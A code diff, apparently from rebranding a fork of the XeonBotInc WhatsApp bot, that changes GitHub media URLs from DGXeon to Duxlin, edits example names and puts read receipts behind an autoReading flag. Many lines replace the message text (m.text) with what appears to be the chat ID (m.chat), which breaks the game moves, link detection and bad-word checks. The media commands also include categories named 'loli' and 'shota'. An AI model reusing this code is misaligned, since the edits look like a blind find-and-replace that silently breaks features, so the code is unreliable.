@@ -77,8 +77,8 @@ let vote = db.others.vote = []
 module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
 try {
         const { type, quotedMsg, mentioned, now, fromMe } = m
-        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
-        const budy = (typeof m.text == 'string' ? m.text : '')
+        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.chat) : ''
+        const budy = (typeof m.chat == 'string' ? m.chat : '')
         const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
         const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
         const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
@@ -252,12 +252,10 @@ if (!m.key.fromMe) return
 
 //chat counter (console log)
         if (m.message && m.isGroup) {
-            XeonBotInc.readMessages([m.key])
             console.log(color(`\n< ================================================== >\n`, 'cyan'))
 			console.log(color(`Group Chat:`, 'green'))
             console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
         } else {
-            XeonBotInc.readMessages([m.key])
             console.log(color(`\n< ================================================== >\n`, 'cyan'))
 			console.log(color(`Private Chat:`, 'green'))
             console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
@@ -308,13 +306,13 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 	    let isWin = !1
 	    let isTie = !1
 	    let isSurrender = !1
-	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
-	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
-	    isSurrender = !/^[1-9]$/.test(m.text)
+	    //reply(`[DEBUG]\n${parseInt(m.chat)}`)
+	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.chat)) return
+	    isSurrender = !/^[1-9]$/.test(m.chat)
 	    if (m.sender !== room13.game.currentTurn) { 
 	    if (!isSurrender) return !0
 	    }
-	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
+	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.chat) - 1))) {
 	    reply({
 	    '-3': 'Game Has Ended',
 	    '-2': 'Invalid',
@@ -371,8 +369,8 @@ Type *surrender* to surrender and admit defeat`
 	    if (roof) {
 	    let win = ''
 	    let tie = false
-	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
-	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
+	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.chat) && m.isGroup && roof.status == 'wait') {
+	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.chat)) {
 	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
 	    delete this.suit[roof.id]
 	    return !0
@@ -406,16 +404,16 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    let b = /rock/i
 	    let k = /paper/i
 	    let reg = /^(scissors|rock|paper)/i
-	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
-	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
-	    roof.text = m.text
-	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (jwb && reg.test(m.chat) && !roof.pilih && !m.isGroup) {
+	    roof.pilih = reg.exec(m.chat.toLowerCase())[0]
+	    roof.text = m.chat
+	    m.reply(`You have chosen ${m.chat} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
 	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
 	    }
-	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
-	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
-	    roof.text2 = m.text
-	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
+	    if (jwb2 && reg.test(m.chat) && !roof.pilih2 && !m.isGroup) {
+	    roof.pilih2 = reg.exec(m.chat.toLowerCase())[0]
+	    roof.text2 = m.chat
+	    m.reply(`You have chosen ${m.chat} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
 	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
 	    }
 	    let stage = roof.pilih
@@ -667,14 +665,22 @@ const repPy = {
 //let xeonrecordin = ['recording','composing']
 //let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
 
+//auto typing
 if (global.autoTyping) {
 if (command) {
 XeonBotInc.sendPresenceUpdate('composing', from)
 }
 }
+//auto recording
 if (global.autoRecord) {
 if (command) {
 XeonBotInc.sendPresenceUpdate('recording', from)
+}
+}
+//auto reading
+if (global.autoReading) {
+if (command) {
+XeonBotInc.readMessages([m.key])
 }
 }
 
@@ -1034,7 +1040,7 @@ async function replyprem(teks) {
         if (!isBotAdmins) return XeonStickBotAdmin()
         let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
         let isLinkThisGc = new RegExp(gclink, 'i')
-        let isgclink = isLinkThisGc.test(m.text)
+        let isgclink = isLinkThisGc.test(m.chat)
         if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
         if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
         if (XeonTheCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
@@ -1116,7 +1122,7 @@ XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@
 //anti bad words by xeon
 if (antiToxic)
 if (BadXeon.includes(messagesD)) {
-if (m.text) {
+if (m.chat) {
 bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
@@ -2096,7 +2102,7 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+XeonBotInc_dev = await getBuffer(`https://github.com/Duxlin/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
 case 'friend':
@@ -2227,7 +2233,7 @@ Latest Publish Time : ${eha.latestPublishTime}`)
 }
 break
 case 'ghstalk': case 'githubstalk':{
-if (!q) return replygcxeon(`Example ${prefix+command} DGXeon`)
+if (!q) return replygcxeon(`Example ${prefix+command} Duxlin`)
 XeonStickWait()
 aj = await githubstalk.githubstalk(`${q}`)
 XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
@@ -3077,14 +3083,14 @@ await replygcxeon(`Done`)
 break
 case 'setbotname':{
 if (!XeonTheCreator) return XeonStickOwner()
-if (!text) return replygcxeon(`Where is the name?\nExample: ${prefix + command} Dux Bot`)
+if (!text) return replygcxeon(`Where is the name?\nExample: ${prefix + command} Cheems Bot`)
     await XeonBotInc.updateProfileName(text)
     replygcxeon(`Success in changing the name of bot's number`)
     }
     break
 case 'setbotbio':{
 if (!XeonTheCreator) return XeonStickOwner()
-if (!text) return replygcxeon(`Where is the text?\nExample: ${prefix + command} Dux Bot`)
+if (!text) return replygcxeon(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
     await XeonBotInc.updateProfileStatus(text)
     replygcxeon(`Success in changing the bio of bot's number`)
     }
@@ -3660,7 +3666,7 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
             }
             break 
 case 'lockcmd': {
-                if (!isCreator) return XeonStickOwner()
+                if (!XeonTheCreator) return XeonStickOwner()
                 if (!m.quoted) return replygcxeon('Reply Message!')
                 if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
                 let hash = m.quoted.fileSha256.toString('base64')
@@ -4975,107 +4981,107 @@ case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzaw
 
 XeonStickWait()
 let heyy
-if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
-if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
-if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
-if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
-if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
-if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
-if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
-if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
-if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
-if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
-if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
-if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
-if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
-if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
-if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
-if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
-if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
-if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
-if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
-if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
-if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
-if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
-if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
-if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
-if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
-if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
-if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
-if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
-if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
-if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
-if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
-if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
-if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
-if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
-if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
-if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
-if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
-if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
-if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
-if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
-if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
-if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
-if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
-if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
-if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
-if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
-if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
-if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
-if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
-if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
-if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
-if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
-if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
-if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
-if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
-if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
-if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
-if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
-if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
-if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
-if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
-if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
-if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
-if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
-if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
-if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
-if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
-if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
-if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
-if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
-if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
-if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
-if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
-if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
-if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
-if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
-if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
-if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
-if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
-if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
-if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
-if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
-if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
-if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
-if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
-if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
-if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
-if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
-if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
-if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
-if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
-if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
-if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
-if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
-if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
-if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
-if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
-if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
-if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
-if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
-if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
+if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/akira.json')
+if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/akiyama.json')
+if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/ana.json')
+if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/art.json')
+if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/asuna.json')
+if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/ayuzawa.json')
+if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/boneka.json')
+if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/boruto.json')
+if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/bts.json')
+if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cecan.json')
+if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/chiho.json')
+if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/chitoge.json')
+if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cogan.json')
+if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cosplay.json')
+if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cosplayloli.json')
+if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cosplaysagiri.json')
+if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/cyber.json')
+if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/deidara.json')
+if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/doraemon.json')
+if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/eba.json')
+if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/elaina.json')
+if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/emilia.json')
+if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/erza.json')
+if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/exo.json')
+if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/femdom.json')
+if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/freefire.json')
+if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/gamewallpaper.json')
+if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/glasses.json')
+if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/gremory.json')
+if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/hekel.json')
+if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/hestia.json')
+if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/husbu.json')
+if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/inori.json')
+if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/islamic.json')
+if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/isuzu.json')
+if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/itachi.json')
+if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/itori.json')
+if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/jeni.json')
+if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/jiso.json')
+if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/justina.json')
+if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kaga.json')
+if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kagura.json')
+if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kakasih.json')
+if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kaori.json')
+if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kartun.json')
+if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/katakata.json')
+if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/keneki.json')
